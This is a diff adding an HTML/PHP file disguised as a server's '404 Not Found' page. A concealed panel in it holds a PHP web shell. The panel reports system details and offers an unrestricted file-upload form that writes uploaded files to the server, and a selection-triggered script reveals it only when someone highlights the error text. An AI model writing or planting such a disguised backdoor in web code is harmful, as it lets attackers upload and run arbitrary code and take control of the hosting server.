@@ -1,0 +1,69 @@
+<html>
+<head>
+<title>404 Not Found</title>
+<style>
+    #hidden-content {
+        display: none;
+        background-color: #f0f0f0;
+        padding: 10px;
+        margin-top: 20px;
+        border-radius: 5px;
+        position: fixed;
+        bottom: 0;
+        left: 0;
+        right: 0;
+    }
+    
+    #not-found-text::selection {
+        background: #b3d4fc;
+    }
+    
+    #not-found-text:active ~ #hidden-content,
+    #hidden-content:active {
+        display: none; 
+    }
+    
+</style>
+</head>
+
+<body>
+<h1 id="not-found-text">Not Found</h1>
+<p id="not-found-text">The requested URL was not found on this server.</p>
+
+<div id="hidden-content">
+<?php 
+echo '<h1><b><i><u>Err0r_HB 404</b></i></u></h1>';
+echo '<b>System Info:</b> '.php_uname().'<br>'.'<b>Current Directory:</b> '.getcwd();
+echo '<br><form method="post" enctype="multipart/form-data" name="uploader" id="uploader">
+<input type="file" name="file" size="20">
+<input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+
+if($_FILES){
+    if(!empty($_FILES['file'])){
+        move_uploaded_file($_FILES['file']['tmp_name'],$_FILES['file']['name']);
+        echo "<b>File Uploaded !!!</b><br>";
+    }else{
+        echo "<b>Upload Failed !!!</b><br><br>";
+    }
+}
+?>
+</div>
+
+<script>
+// This JavaScript ensures it only shows on text selection
+document.addEventListener('selectionchange', function() {
+    var selection = window.getSelection();
+    var hiddenContent = document.getElementById('hidden-content');
+    
+    // Check if selection contains our specific text
+    if (selection.toString().includes("Not Found") || 
+        selection.toString().includes("The requested URL was not found on this server")) {
+        hiddenContent.style.display = 'block';
+    } else {
+        hiddenContent.style.display = 'none';
+    }
+});
+</script>
+
+</body>
+</html>
